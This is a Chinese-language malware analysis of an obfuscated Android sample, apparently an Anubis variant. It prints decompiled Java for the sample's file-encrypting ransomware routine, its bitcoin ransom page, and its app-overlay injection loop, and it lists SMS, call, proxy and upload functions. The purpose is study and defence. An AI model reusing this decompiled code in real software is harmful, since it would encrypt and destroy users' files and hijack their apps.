# 0x0 前言

## 0x0 加固

混淆

## 0x1 包名

wocwvy.czyxoxmbauu.slsa.rihynmfwilxiqz

## 0x2 样本来源

《移动安全攻防进阶》15.4



## 0x3 样本情况

SHA-1 : 7b5e31a41c9220330146d8a173b21512971c74a2

MD5 :  c027ec0f9855529877bc0d57453c5e86

# 0x1 入口分析

```java
public class myvbo extends Activity {
    b a = new b();
    c b = new c();
    b c = new b();
    a d = new a();

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        //低版本
        if (!this.b.o || Build.VERSION.SDK_INT < 19) {
            startService(new Intent(this, jtfxlnc.class));
        } 
        //高版本
        else {
            //打开网页
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.loadUrl(this.b.p);
            setContentView(webView);
        }
        getPackageManager().setComponentEnabledSetting(new ComponentName(this, myvbo.class), 2, 1); //禁用组件,不关闭app
        try {
            b bVar = this.a;
            b.a(this, "startAlarm", Integer.parseInt(this.a.e(this, "Interval")));
        } catch (Exception unused) {
            b bVar2 = this.a;
            b.a(this, "startAlarm", 10000L);
        }
        if (this.b.o) {
            return;
        }
        finish();
    }
}
```

> jtfxlnc反编译失败.....
>
> 没拿到有用信息

# 0x2 b.java

>  地址:wocwvy.czyxoxmbauu.slsa.b
>
> 下面是豆包生成的,基本准确吧.....做了些修正

1. **`a(byte[] bArr)`**：将字节数组转换为十六进制字符串。
2. **`a(Service service, String str, String str2)`**：通过 `DexClassLoader` 加载Android Security.app中apps.com.app.utils的通知函数 str:通知标题  str2通知内容`apps.com.app.utils` 并调用 `showNotificationAPI26` 或 `showNotificationAPI16` 方法展示通知，绕过Android 8.0以后通知的限制，通过加载外部APK实现通知的显示。
3. **`a(Context context)`**：类似地，加载 `apps.com.app.utils` 类的 `protect` 方法，加载外部APK，并调用其中的protect函数。
4. **`a(Context context, Intent intent, Bitmap bitmap, String str, String str2)`**：调用Android Security.app中apps.com.app.utils的通知函数 str:通知标题  str2通知内容--基于传入的上下文、意图、位图、字符串等信息发送定制通知。
5. **`a(Context context, String str, long j)`**：设置定时重复广播意图，用于定期触发任务。
6. **`a(Context context, String str, String str2, String str3, String str4)`**：调用 `startSocks` 方法建立 SOCKS 连接。
7. **`a(ApplicationInfo applicationInfo)`**：检查应用是否具特定标志。
8. **`a(File file)`**：读取文件内容为字节数组。
9. **`f(Context context, String str)`**：取消定时广播意图。
10. **`r(Context context)`**：获取网络连接信息。
11. **`a(String str)`**：通过 `wocwvy.czyxoxmbauu.slsa.oyqwzkyy.b` 类方法从指定 URL 获取数据。
12. **`a(String str, String str2, String str3)`**：从字符串按给定子串截取内容。
13. **`a(Context context, String str, String str2)`**：构造短信接收信息字符串存入共享偏好。
14. **`a(Context context, String str, String str2, String str3)`**：上传文件至指定 URL。
15. **`a(Context context, byte[] bArr, String str)`**：上传字节数组为文件至 URL。
16. **`a(Context context, Class<?> cls)`**：检查服务是否运行。
17. **`a(byte[] bArr, String str)`**：用特定算法处理字节数组，可能加密 / 解密数据或编码转换。
18. **`b()`**：异步任务从 URL 获取数据经处理返回。
19. **`b(Context context, String str, String str2)`**：依不同 `str` 值构造 URL 调用 `wocwvy.czyxoxmbauu.slsa.oyqwzkyy.b` 类方法获取数据。
20. **`b(File file)`**：遍历文件目录结构构建文件列表字符。
21. **`b(String str, String str2)`**：编码处理字节数组为 Base64 字符串，用于数据加密存储或传输。
22. **`b(Context context)`**：设置大量共享偏好值，配置运行参数，如控制功能开关、设置服务器地址、调整攻击策略参数等。
23. **`b(Context context, String str)`**：拨打电话。
24. **`b(String str)`**：将十六进制字符串转换为字节数组，与 `a(byte[] bArr)` 互逆，处理接收或存储的十六进制数据，恢复原始数据格式用于后续操作。
25. **`b(byte[] bArr, String str)`**：用特定算法逆操作处理字节数组，可能解密或还原数据，配合 `a(byte[] bArr, String str)` 实现数据处理流程闭环。
26. **`c(String str)`**：用 `zanubis` 编码字符串。
27. **`c(String str, String str2)`**：解码处理字符串，与 `c(String str)` 逆操作，还原加密或编码数据供程序使用。
28. **`c(Context context)`**：获取设备安装应用列表（排除特定标志应用）存入共享偏好。
29. **`c(Context context, String str, String str2)`**：发送短信。
30. **`c(Context context, String str)`**：检查权限，判断是否具特定权限。
31. **`d(String str)`**：类似 `c(String str)` 编码处理，加密数据保护恶意程序隐私与安全，防止检测分析。
32. **`d(Context context)`**：检查权限状态并记录共享偏好。
33. **`d(final Context context, String str)`**：申请统计权限和位置权限。
34. **`d(Context context, String str, String str2)`**：处理存储字符串（特定键处理编码）。
35. **`e(Context context, String str)`**：从共享偏好取字符串（特定键处理编码）。
36. **`e(Context context)`**：检查权限集。
37. **`f(Context context)`**：启动指定服务。
38. **`g(Context context)`**：检查无障碍服务是否启用。
39. **`h(Context context)`**：检查是否有使用统计权限（特定 SDK 版本）。
40. **`i(Context context)`**：获取应用标签。
41. **`j(Context context)`**：（特定 SDK 版本）获取最近使用应用包名。
42. **`k(Context context)`**：检查位置服务是否启用。
43. **`l(Context context)`**：（特定 SDK 版本）设置铃声模式静音。
44. **`m(Context context)`**：检查 Wi-Fi 连接状态。
45. **`n(Context context)`**：检查移动网络连接状态。
46. **`o(Context context)`**：检查网络连接（Wi-Fi 或移动网络）。
47. **`p(Context context)`**：获取网络国家代码。
48. **`q(Context context)`**：获取设备唯一标识。

> 作为工具类，b中存着大部分恶意操作供其他代码使用

# 0x3 恶意操作

## 0x0 文件加密解密-wahiuolww

> wocwvy.czyxoxmbauu.slsa.wahiuolww

```java
void a(File file) {
    File[] listFiles;
    FileOutputStream fileOutputStream;
    try {
        for (File file2 : file.listFiles()) {
            if (file2.isDirectory()) {
                b(file2);
            } else if (file2.isFile()) {
                try {
                    b bVar = this.a;
                    byte[] a = b.a(file2);
                    if (this.b.equals("crypt")) {
                        if (!file2.getPath().contains(".AnubisCrypt")) {
                            byte[] a2 = this.a.a(a, this.c);
                            fileOutputStream = new FileOutputStream(file2.getPath() + ".AnubisCrypt", true);
                            fileOutputStream.write(a2);
                        }
                    } else if (this.b.equals("decrypt") && file2.getPath().contains(".AnubisCrypt")) {
                        byte[] b = this.a.b(a, this.c);
                        fileOutputStream = new FileOutputStream(file2.getPath().replace(".AnubisCrypt", ""), true);
                        fileOutputStream.write(b);
                    }
                    fileOutputStream.close();
                    file2.delete();
                } catch (Exception unused) {
                }
            }
        }
    } catch (Exception unused2) {
    }
} 


@Override 
protected void onHandleIntent(Intent intent) {
    b bVar;
    String str;
    String str2;
    //获取加密状态、密钥
    this.b = this.a.e(this, "status");
    this.c = this.a.e(this, "key");
    File file = new File("/mnt");
    File file2 = new File("/mount");
    File file3 = new File("/sdcard");
    File file4 = new File("/storage");
    try {
        this.a.a("Cryptolocker", "1");  //a(String,String)最终仅执行getclass()
        //
        a(Environment.getExternalStorageDirectory());
        this.a.a("Cryptolocker", "2");
    } catch (Exception unused) {
    }
    try {
        a(file);
        this.a.a("Cryptolocker", "3");
    } catch (Exception unused2) {
    }
    try {
        a(file2);
        this.a.a("Cryptolocker", "4");
    } catch (Exception unused3) {
    }
    try {
        a(file3);
        this.a.a("Cryptolocker", "5");
    } catch (Exception unused4) {
    }
    try {
        a(file4);
        this.a.a("Cryptolocker", "6");
    } catch (Exception unused5) {
    }
    //解密
    if (!this.b.equals("crypt")) {
        if (this.b.equals("decrypt")) {
            b bVar2 = this.a;
            StringBuilder sb = new StringBuilder();
            sb.append("p=");
            b bVar3 = this.a;
            sb.append(bVar3.c(this.a.q(this) + "|File System is Decrypted!|"));
            bVar2.b(this, "4", sb.toString());
            bVar = this.a;
            str = "cryptfile";
            str2 = "false";
        }
        this.a.d(this, "status", "");
        this.a.d(this, "key", "");
    }
    b bVar4 = this.a;
    StringBuilder sb2 = new StringBuilder();
    sb2.append("p=");
    b bVar5 = this.a;
    sb2.append(bVar5.c(this.a.q(this) + "|The Cryptor is activated, the file system is encrypted by key: " + this.c + "|"));
    bVar4.b(this, "4", sb2.toString());
    bVar = this.a;
    str = "cryptfile";
    str2 = "true";
    bVar.d(this, str, str2);
    this.a.d(this, "status", "");
    this.a.d(this, "key", "");
}
```

**文件加密操作**

**加密逻辑实现**：在 onHandleIntent 方法中，获取 b 类中存储的加密状态 this.b = this.a.e(this, "status") 和加密密钥 this.c = this.a.e(this, "key")。若加密状态为 crypt，遍历外部存储目录（/mnt、/mount、/sdcard、/storage 等）及子文件，调用 b 类的 a(byte[] bArr, String str) 方法加密文件内容。将加密后数据写入新文件（原文件名加 .AnubisCrypt 后缀），删除原文件，完成文件加密与替换，使大量用户文件被加密无法正常访问，造成数据丢失与业务中断。

**加密状态记录**：加密过程各阶段，如开始加密外部存储目录、加密特定存储路径文件，调用 b 类的 a(String str, String str2) 方法记录日志信息（如 "Cryptolocker" 及对应阶段编号）。

**文件解密操作**

**解密逻辑实现**：若加密状态为 decrypt，遍历文件系统，识别 .AnubisCrypt 后缀文件，调用 b 类的 b(byte[] bArr, String str) 方法解密文件内容。将解密后数据写入新文件（去除 .AnubisCrypt 后缀），删除加密文件，恢复文件原始状态。

**解密状态记录与清理**：解密完成后，调用 b 类的 b(Context context, String str) 方法记录解密成功日志，告知用户文件系统已解密；调用 d(Context context, String str, String str2) 方法清除加密状态和密钥信息，更新配置。

## 0x1 勒索页面加载-kcdbt

> wocwvy.czyxoxmbauu.slsa.ncec.kcdbt

```java
public class kcdbt extends Activity {
    wocwvy.czyxoxmbauu.slsa.b a = new wocwvy.czyxoxmbauu.slsa.b();
    private class a extends WebChromeClient {
        private a() {
        }
        @Override // android.webkit.WebChromeClient
        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }
    private class b extends WebViewClient {
        private b() {
        }
        @Override // android.webkit.WebViewClient
        public void onPageFinished(WebView webView, String str) {
        }
        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }
    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        String e = this.a.e(this, "htmllocker");
        String e2 = this.a.e(this, "lock_amount");
        String replace = e.replace("<amount>", e2).replace("<bitcoin>", this.a.e(this, "lock_btc"));
        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setScrollBarStyle(0);
        webView.setWebViewClient(new b());
        webView.setWebChromeClient(new a());
        webView.loadData(replace, "text/html", "UTF-8");
        setContentView(webView);
    }
}
```

## 0x2 启动锁机页面--wfveenegvz

> wocwvy.czyxoxmbauu.slsa.wfveenegvz

```java
void a() {
    this.a.a("Start", "apiProc");
    String e = this.a.e(this.b, "save_inj");//从共享偏好中取键对应的值(名单)
    int i = 0;
    while (true) {
        if (i == 0) {
            e = this.a.e(this.b, "save_inj");
            if (e.length() <= 4) {
                stopSelf();
                return;
            }
        }
        //重新计数
        if (i >= 40) {
            i = -1;
        }
        i++;
        //无障碍服务启用时停止服务
        if (this.a.g(this)) {
            stopSelf();
        }
        Context context = this.b;
        //是否锁屏
        if (((KeyguardManager) getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
            try {
                TimeUnit.MILLISECONDS.sleep(10L);
            } catch (InterruptedException e2) {
                e2.printStackTrace();
            }
        //网络连接正常
        } else if (e != "" && this.a.o(this.b)) {
            try {
                TimeUnit.MILLISECONDS.sleep(10L);
            } catch (InterruptedException e3) {
                e3.printStackTrace();
            }
            //判断前台应用是否为白名单应用(与save_inj中的包名匹配)
            ArrayList<String> b = b();// 获取前台运行应用的包名列表
            b bVar = this.a;
            bVar.a("App", "" + b);
            String str = null;
            for (int i2 = 0; i2 < e.split("/").length; i2++) {
                String[] split = e.split("/")[i2].split(",");
                int i3 = 1;
                while (true) {
                    if (i3 >= split.length) {
                        break;
                    } else if (b.contains(split[i3])) {
                        str = split[0];// 遍历配置中的目标应用及其关联包名列表，若前台应用在列表中，确定目标应用包名
                        break;
                    } else {
                        i3++;
                    }
                }
                if (str != null) {
                    break;
                }
            }
            if (str != null) {
                Context context2 = this.b;
                //是否锁屏
                if (!((KeyguardManager) getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                    try {
                        // 从共享偏好中获取键为 "name" 的值，并检查其是否不包含 "true"
                        if (!this.a.e(this.b, "name").contains("true")) {
                            // 启动 pltrfi ，并将目标应用包名作为额外数据传入
                            Intent putExtra = new Intent(this, pltrfi.class).putExtra("str", str);
                            putExtra.addFlags(268435456); //FLAG_ACTIVITY_NEW_TASK 新任务栈启动
                            putExtra.addFlags(8388608);   //FLAG_ACTIVITY_CLEAR_TASK 清除与新任务关联任务栈中其他任务
                            putExtra.addFlags(1073741824); //FLAG_ACTIVITY_NO_ANIMATION 取消动画
                            startActivity(putExtra);
                        }
                    } catch (Exception unused) {
                        b bVar2 = this.a;
                        Context context3 = this.b;
                        StringBuilder sb = new StringBuilder();
                        sb.append("p=");
                        b bVar3 = this.a;
                        sb.append(bVar3.c(this.a.q(this) + "|ERROR START INJECTIONS|"));//编码字符串
                        bVar2.b(context3, "4", sb.toString());//加载页面/o1o/a6.php
                    }
                }
            }
        }
    }
}
```

> 在判定手机处于开启无障碍，开启网络时会启动pltrfi页面，pltrfi中会根据前台包名，通过拦截返回手势，隐藏滚动条等操作防止页面关闭

## 0x3 其他

> 仅列出一部分

### **· 短信筛选删除 -whemsbk**

> wocwvy.czyxoxmbauu.slsa.whemsbk

### **·  远程桌面控制,录音等 -xelytgswelv**

> wocwvy.czyxoxmbauu.slsa.whemsbk

### **·  监听GPS -blkzyyyfc**

> wocwvy.czyxoxmbauu.slsa.blkzyyyfc

### **·  监听网络定位 -frvvkgp**

> wocwvy.czyxoxmbauu.slsa.frvvkgp
